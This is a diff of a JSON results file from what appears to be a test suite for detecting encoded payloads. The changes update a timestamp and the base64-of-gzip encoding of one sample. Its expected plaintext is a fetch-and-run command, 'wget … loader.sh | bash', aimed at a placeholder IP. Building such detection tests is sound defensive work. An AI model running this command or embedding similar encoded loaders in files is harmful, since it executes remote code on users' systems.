@@ -1,5 +1,5 @@
 {
-  "generated_at": "2026-08-09T08:31:06Z",
+  "generated_at": "2026-09-01T13:19:35Z",
   "total": 12,
   "passed": 12,
   "pass_rate": 1.0,
@@ -282,8 +282,8 @@
     {
       "sample_id": "S08_wget_b64_gzip",
       "wrap": "b64(gzip(P))",
-      "encoded_input": "H4sIAM04eGoC/ytPTy1R0C3011XIKCkpsNLXN7S00DM11DM0MNAzMdLPyU9MSS3SK85QqFFISizOAAAJAeOYLwAAAA==",
-      "encoded_input_preview": "H4sIAM04eGoC/ytPTy1R0C3011XIKCkpsNLXN7S00DM11DM0MNAzMdLPyU9MSS3SK85QqFFISizOAAAJAeOYLwAAAA==",
+      "encoded_input": "H4sIALLKlmoC/ytPTy1R0C3011XIKCkpsNLXN7S00DM11DM0MNAzMdLPyU9MSS3SK85QqFFISizOAAAJAeOYLwAAAA==",
+      "encoded_input_preview": "H4sIALLKlmoC/ytPTy1R0C3011XIKCkpsNLXN7S00DM11DM0MNAzMdLPyU9MSS3SK85QqFFISizOAAAJAeOYLwAAAA==",
       "input_len": 92,
       "expected_plaintext": "wget -qO- http://198.51.100.42/loader.sh | bash",
       "expect_token": "wget",
